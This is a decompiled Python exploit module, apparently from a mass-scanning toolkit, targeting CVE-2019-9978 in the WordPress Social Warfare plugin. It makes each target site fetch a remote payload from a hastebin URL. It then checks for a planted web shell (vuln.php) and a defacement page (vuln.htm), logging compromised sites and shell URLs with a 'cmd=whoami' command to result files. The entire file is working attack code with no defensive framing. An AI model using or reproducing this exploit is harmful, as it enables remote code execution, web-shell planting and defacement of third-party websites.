# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2019_9978SocialWarfare.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        Payload = 'https://hastebin.com/raw/etonipusij'
        exp = 'http://{}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={}'.format(site, Payload)
        requests.get(exp, timeout=10, headers=Headers)
        CheckShell = requests.get('http://{}/wp-admin/vuln.php'.format(site), timeout=10, headers=Headers)
        CheckIndex = requests.get('http://{}/wp-admin/vuln.htm'.format(site), timeout=10, headers=Headers)
        if 'Vuln!!' in str(CheckIndex.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write('{}/wp-admin/vuln.htm\n'.format(site))
            if 'Vuln!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write('{}/wp-admin/vuln.php?cmd=whoami;);\n'.format(site))
            return printModule.returnYes(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')